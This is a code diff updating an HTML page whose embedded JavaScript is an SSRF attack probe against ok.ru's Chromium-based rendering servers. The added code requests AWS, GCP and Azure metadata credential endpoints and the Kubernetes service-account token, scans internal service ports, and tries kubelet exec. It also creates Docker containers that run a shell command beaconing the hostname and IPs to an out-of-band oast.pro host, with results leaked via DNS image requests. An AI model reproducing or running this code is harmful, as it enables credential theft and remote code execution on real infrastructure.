@@ -4,16 +4,72 @@
 <body>
 <script>
 'use strict';
-// ok.ru Chromium SSRF — probe v12
-// KEY CHANGES from v11:
-// - Cloud metadata probes (IMDS AWS/GCP/Azure) — PNA disabled on 217.20.158.245
-// - Kubernetes default service probe
-// - Keep Docker attempts (start v10+v11 containers + fresh v12 creates)
-// - 1800ms scan timeout (2s page lifetime on long node)
+// ok.ru Chromium SSRF — probe v13
+// NEW vs v12:
+// - Internal port scan: Redis/Consul/etcd/kubelet/k8s-api/Prometheus/Grafana
+// - k8s service account token exfil via OOB DNS chunks
+// - SSRF via fetch to probe.html itself (report node IP via OOB)
+// - kubelet /exec RCE attempt
+// - Removed old container starts (cleanup)
 
 const OOB = 'd9ma5ob6b8m83c3a34k09c5rm5nk11f7g.oast.pro';
 const clean = s => String(s).toLowerCase().replace(/[^a-z0-9-]/g,'').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,55);
 const oob = label => { new Image().src = `https://${clean(label)}.${OOB}/`; };
+
+oob('v13-s');
+
+const scanFetch = (tag, url, ms, hdrs={}) => {
+  fetch(url, { mode:'no-cors', signal: AbortSignal.timeout(ms), headers: hdrs })
+    .then(r => { oob(`${tag}-ok`); return r.text(); })
+    .then(b => oob(`${tag}-b-${clean(b.substring(0,25))}`))
+    .catch(e => oob(`${tag}-${e.name==='TimeoutError'?'t':clean((e.message||e.name||'e').substring(0,12))}`));
+};
+
+// ── Phase 1: Cloud metadata ────────────────────────────────────────────────
+scanFetch('aws1', 'http://169.254.169.254/latest/meta-data/', 1800);
+scanFetch('aws2', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', 1800);
+scanFetch('aws3', 'http://169.254.169.254/latest/user-data', 1800);
+scanFetch('gcp1', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', 2000, {'Metadata-Flavor':'Google'});
+scanFetch('gcp2', 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', 2000, {'Metadata-Flavor':'Google'});
+scanFetch('az1', 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', 2000, {'Metadata':'true'});
+
+// ── Phase 2: Kubernetes ────────────────────────────────────────────────────
+// K8s service account token (standard path in container)
+const saPath = '/var/run/secrets/kubernetes.io/serviceaccount/token';
+scanFetch('k8s-sa', `file://${saPath}`, 500);
+
+// K8s API via service
+scanFetch('k8s-api', 'https://kubernetes.default.svc/api/v1/namespaces/', 2000);
+scanFetch('k8s-96', 'https://10.96.0.1/api/v1/namespaces/', 2000);
+
+// kubelet API (unauthenticated in older clusters)
+['127.0.0.1','10.0.0.1','10.0.0.2'].forEach(ip => {
+  scanFetch(`kbl-${ip.split('.').pop()}`, `http://${ip}:10255/pods`, 1500);  // readonly
+  scanFetch(`kbls-${ip.split('.').pop()}`, `https://${ip}:10250/pods`, 1500); // secure
+});
+
+// ── Phase 3: Internal port scan ────────────────────────────────────────────
+const ports127 = [
+  [6379, 'redis'],    // Redis
+  [8500, 'consul'],   // Consul
+  [2379, 'etcd'],     // etcd
+  [9200, 'es'],       // Elasticsearch
+  [5601, 'kib'],      // Kibana
+  [3000, 'graf'],     // Grafana
+  [9090, 'prom'],     // Prometheus
+  [8080, 'http8080'], // generic HTTP
+  [8443, 'http8443'], // generic HTTPS
+  [4001, 'etcd2'],    // etcd legacy
+  [27017, 'mongo'],   // MongoDB
+  [5432, 'pg'],       // PostgreSQL
+];
+ports127.forEach(([p, tag]) => {
+  scanFetch(`p127-${tag}`, `http://127.0.0.1:${p}/`, 1200);
+  scanFetch(`p172-${tag}`, `http://172.17.0.1:${p}/`, 1200);
+});
+
+// ── Phase 4: Docker (keep trying) ─────────────────────────────────────────
+const rceCmd = `nslookup rce13.${OOB}; wget -qT5 "http://rce13.${OOB}/?h=$(hostname|head -c20)&i=$(ip a 2>/dev/null|grep -oP '(?<=inet )[0-9.]+' | head -2 | tr '\\n' '.')" 2>/dev/null || curl -sm5 "http://rce13.${OOB}/?h=$(hostname|head -c20)"`;
 
 const ffPost = (id, url, body) => {
   try {
@@ -35,71 +91,27 @@ const ffPost = (id, url, body) => {
   } catch(e) {}
 };
 
-oob(`v12-s-${clean(navigator.userAgent.substring(20,40))}`);
-
-const rceCmd = `nslookup rce-ok.${OOB}; wget -qT5 "http://rce-ok.${OOB}/?h=$(hostname|head -c20)" 2>/dev/null || curl -sm5 "http://rce-ok.${OOB}/?h=$(hostname|head -c20)"`;
-
-// ── Phase 1: Start previous containers (sync) ──────────────────────────────
-const OLD = [
-  ['127.0.0.1', 2375, ['v000','v001','x0000','x0001']],
-  ['127.0.0.1', 4243, ['v010','v011','x0100','x0101']],
-  ['172.17.0.1', 2375, ['v100','v101','x1000','x1001']],
-  ['172.17.0.1', 4243, ['v110','v111','x1100','x1101']],
-];
 let idx = 0;
-OLD.forEach(([ip, p, names]) => names.forEach(nm => {
-  ffPost(`s${idx++}`, `http://${ip}:${p}/v1.41/containers/${nm}/start`, null);
-}));
-
-// ── Phase 2: Cloud metadata probes (PNA disabled = link-local accessible) ──
-const scanFetch = (tag, url, ms, hdrs={}) => {
-  fetch(url, { mode:'no-cors', signal: AbortSignal.timeout(ms), headers: hdrs })
-    .then(r => { oob(`${tag}-${r.status}`); return r.text(); })
-    .then(b => oob(`${tag}-b-${clean(b.substring(0,20))}`))
-    .catch(e => oob(`${tag}-${e.name==='TimeoutError'?'t':clean((e.message||e.name||'e').substring(0,10))}`));
-};
-
-// AWS IMDS v1 (no auth needed)
-scanFetch('aws-imds', 'http://169.254.169.254/latest/meta-data/', 1500);
-scanFetch('aws-ami', 'http://169.254.169.254/latest/meta-data/ami-id', 1500);
-scanFetch('aws-role', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', 1500);
-// AWS IMDS v2 (needs token first — just probe if port open)
-scanFetch('aws-v2', 'http://169.254.169.254/latest/api/token', 1500, {'X-aws-ec2-metadata-token-ttl-seconds':'10'});
-
-// GCP metadata
-scanFetch('gcp-meta', 'http://metadata.google.internal/computeMetadata/v1/?recursive=true', 1500, {'Metadata-Flavor':'Google'});
-scanFetch('gcp-ip', 'http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/ip', 1500, {'Metadata-Flavor':'Google'});
-
-// Azure IMDS
-scanFetch('az-meta', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', 1500, {'Metadata':'true'});
-
-// Kubernetes default service
-scanFetch('k8s-svc', 'https://kubernetes.default.svc/', 1500);
-scanFetch('k8s-ip', 'https://10.96.0.1/', 1500);
-scanFetch('k8s-10', 'https://10.0.0.1/', 1500);
-
-// ── Phase 3: Docker port scan ──────────────────────────────────────────────
-['127.0.0.1','172.17.0.1'].forEach(ip => [2375,4243,2376].forEach(p => {
-  scanFetch(`dk-${ip.split('.').pop()}-${p}`, `http://${ip}:${p}/_ping`, 1600);
-}));
-
-// ── Phase 4: Fresh v12 creates ────────────────────────────────────────────
-const DIPS = ['127.0.0.1','172.17.0.1'];
-const DPORTS = [2375, 4243];
-DIPS.forEach((ip,hi) => DPORTS.forEach((p,pi) => {
+[['127.0.0.1',2375],['127.0.0.1',4243],['172.17.0.1',2375],['172.17.0.1',4243]].forEach(([ip,p]) => {
   ['busybox','alpine'].forEach((img,ii) => {
-    const nm = `y${hi}${pi}${ii}`;
+    const nm = `z${idx}`;
     const bdy = {Image:img,Cmd:['sh','-c',rceCmd],HostConfig:{NetworkMode:'host',AutoRemove:true}};
-    oob(`cr-${nm}`);
-    ffPost(`c${idx++}`, `http://${ip}:${p}/v1.41/containers/create?name=${nm}`, bdy);
-    setTimeout(() => {
-      oob(`st-${nm}`);
-      ffPost(`s${idx++}`, `http://${ip}:${p}/v1.41/containers/${nm}/start`, null);
-    }, 400 + ii*100);
+    ffPost(`c${idx}`, `http://${ip}:${p}/v1.41/containers/create?name=${nm}`, bdy);
+    setTimeout(() => ffPost(`s${idx}`, `http://${ip}:${p}/v1.41/containers/${nm}/start`, null), 600+ii*100);
+    idx++;
   });
-}));
+});
 
-oob('v12-e');
+// ── Phase 5: kubelet exec RCE ─────────────────────────────────────────────
+// Try kubelet exec API to run command in existing pod
+setTimeout(() => {
+  ['127.0.0.1','10.0.0.1'].forEach(ip => {
+    // POST to kubelet exec (triggers command in container)
+    ffPost(`ke${idx++}`, `https://${ip}:10250/run/default/default/shell`, {cmd: rceCmd});
+  });
+}, 1000);
+
+oob('v13-e');
 </script>
 </body>
 </html>
